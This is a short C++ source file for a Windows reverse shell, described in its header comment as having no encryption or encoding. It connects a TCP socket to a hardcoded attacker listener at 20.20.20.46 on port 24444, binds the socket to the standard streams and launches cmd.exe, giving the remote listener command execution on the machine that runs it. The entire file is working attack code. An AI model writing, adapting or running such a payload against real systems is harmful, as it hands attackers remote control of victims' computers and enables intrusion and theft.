/*
shell.cpp
author: @cocomelonc
windows reverse shell without any encryption/encoding
*/
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#pragma comment(lib, "WS2_32")

WSADATA wsaData;
SOCKET wSock;
struct sockaddr_in hax;
STARTUPINFO sui;
PROCESS_INFORMATION pi;

int main(int argc, char* argv[])
{
	// listener ip, port on attacker's machine
	const char* ip = "20.20.20.46";
	short port = 24444;

	// init socket lib
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	// create socket
	wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);


    hax.sin_family = AF_INET;
    hax.sin_port = htons(port);
    // Replace deprecated inet_addr with inet_pton
    inet_pton(AF_INET, ip, &(hax.sin_addr));


	// connect to remote host
	WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = STARTF_USESTDHANDLES;
	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)wSock;

	// start cmd.exe with redirected streams

    wchar_t cmd[] = L"cmd.exe";
    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
    exit(0);
}
